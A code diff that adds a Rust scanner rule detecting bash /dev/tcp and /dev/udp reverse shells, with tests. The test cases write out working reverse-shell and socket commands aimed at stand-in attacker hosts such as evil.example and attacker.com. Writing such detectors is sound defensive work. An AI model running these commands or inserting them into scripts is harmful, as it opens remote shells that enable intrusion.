@@ -16,6 +16,7 @@ pub fn rules() -> Vec<Rule> {
         ex_012(),
         ex_013(),
         ex_014(),
+        ex_015(),
     ]
 }
 
@@ -466,6 +467,32 @@ fn ex_014() -> Rule {
     }
 }
 
+fn ex_015() -> Rule {
+    Rule {
+        id: "EX-015",
+        name: "Bash /dev/tcp reverse shell",
+        description: "Detects use of bash's /dev/tcp or /dev/udp pseudo-devices, almost exclusively used for reverse shells and out-of-band exfiltration (MITRE T1059, T1071)",
+        severity: Severity::Critical,
+        category: Category::Exfiltration,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Bash TCP pseudo-device: bash -i >& /dev/tcp/host/port, exec <>/dev/tcp/...
+            Regex::new(r"/dev/tcp/").expect("EX-015: invalid regex"),
+            // Bash UDP pseudo-device
+            Regex::new(r"/dev/udp/").expect("EX-015: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("EX-015: invalid regex"),
+        ],
+        message: "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+        recommendation: "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script.",
+        fix_hint: Some(
+            "Remove /dev/tcp and /dev/udp redirections. Legitimate networking should use documented, reviewable tools.",
+        ),
+        cwe_ids: &["CWE-506", "CWE-912"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -590,5 +617,37 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ex_007.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ex_007", findings);
+    }
+
+    #[test]
+    fn test_ex_015() {
+        let rule = ex_015();
+        let test_cases = vec![
+            // Malicious: /dev/tcp and /dev/udp reverse shells
+            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", true),
+            ("exec 5<>/dev/tcp/evil.example/443", true),
+            ("cat < /dev/tcp/attacker.com/80", true),
+            ("sh -c 'exec 196<>/dev/udp/1.2.3.4/53'", true),
+            // Benign: other /dev nodes and unrelated tcp mentions
+            ("echo done > /dev/null 2>&1", false),
+            ("cat /dev/stdin", false),
+            ("read x < /dev/tty", false),
+            ("grep tcp /etc/services", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "EX-015: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ex_015() {
+        let rule = ex_015();
+        let content = include_str!("../../../tests/fixtures/rules/ex_015.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ex_015", findings);
     }
 }
